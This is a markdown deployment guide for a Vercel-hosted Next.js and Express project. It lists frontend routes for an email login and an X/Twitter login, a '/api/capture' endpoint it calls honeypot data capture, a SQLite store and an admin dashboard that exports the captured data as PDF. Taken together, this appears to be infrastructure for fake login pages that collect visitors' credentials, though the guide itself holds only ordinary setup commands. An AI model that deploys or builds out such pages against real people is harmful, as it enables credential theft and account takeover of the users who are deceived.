# Deployment Guide

## Quick Start

### Step 1: Prepare the Upgrade Folder
```bash
cd upgrade
npm install
```

### Step 2: Deploy Frontend to Vercel
```bash
cd frontend
vercel deploy --prod
```

### Step 3: Deploy Backend to Vercel
```bash
cd ../backend/backend
vercel deploy --prod
```

### Step 4: Set Environment Variables
After deployments, set in Vercel dashboard:

**Frontend Project:**
- `NEXT_PUBLIC_API_URL` = Backend URL from Step 3

**Backend Project:**
- `ADMIN_KEY` = Strong secret key
- `PORT` = 3001
- `HOST` = 0.0.0.0

## Architecture

### Frontend (Next.js on Vercel)
- Deployed to Vercel edge network
- Static optimization enabled
- All images in `/public/` folder
- Routes:
  - `/` - Main page
  - `/mail` - Email login
  - `/twitter` - X/Twitter login

### Backend (Express on Vercel Functions)
- Serverless Node.js functions
- SQLite database (stored in `/data` folder)
- Admin dashboard
- API endpoint: `/api/capture`
- Routes:
  - `POST /api/capture` - Honeypot data capture
  - `GET /admin` - Admin dashboard (requires ADMIN_KEY header)
  - `GET /api/export/pdf` - Export data as PDF

## Database

SQLite database is stored in `backend/backend/data/honeypot.sqlite`

For Vercel persistent storage, consider:
- AWS S3 for backups
- PostgreSQL for cloud database
- Azure Blob Storage

## API Integration

Frontend components make requests to:
```javascript
const API_URL = process.env.NEXT_PUBLIC_API_URL || 'http://localhost:3001'
// POST to ${API_URL}/api/capture
```

## Testing Locally

```bash
# Terminal 1 - Frontend
cd frontend
npm run dev

# Terminal 2 - Backend
cd backend/backend
npm run dev
```

Access:
- Frontend: http://localhost:3000
- Backend: http://localhost:3001
- Admin: http://localhost:3001/admin

## Monitoring

Check Vercel dashboard for:
- Function execution logs
- Error tracking
- Performance metrics
- Deployment status
